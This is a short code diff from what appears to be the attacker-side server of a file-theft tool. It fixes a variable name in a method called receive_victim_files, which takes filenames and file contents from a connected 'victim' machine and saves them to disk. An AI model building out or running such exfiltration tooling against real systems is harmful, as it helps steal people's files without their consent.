@@ -96,15 +96,15 @@ class Server:
         print("[CLIENT] : " + msg)
 
     def receive_victim_files(self, conn):
-        filename = connection.recv(Server.MAX_SIZE).decode(Server.FORMAT)
+        filename = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
         print("[RECV] Receiving the filename.")
         file = open(filename, "w")
-        connection.send("Filename received.".encode(Server.FORMAT))
+        conn.send("Filename received.".encode(Server.FORMAT))
 
-        data_file = connection.recv(Server.MAX_SIZE).decode(Server.FORMAT)
+        data_file = conn.recv(Server.MAX_SIZE).decode(Server.FORMAT)
         print("[RECV] Receiving the file data.")
         file.write(data_file)
-        connection.send("Filename received.".encode(Server.FORMAT))
+        conn.send("Filename received.".encode(Server.FORMAT))
 
         file.close() 
 
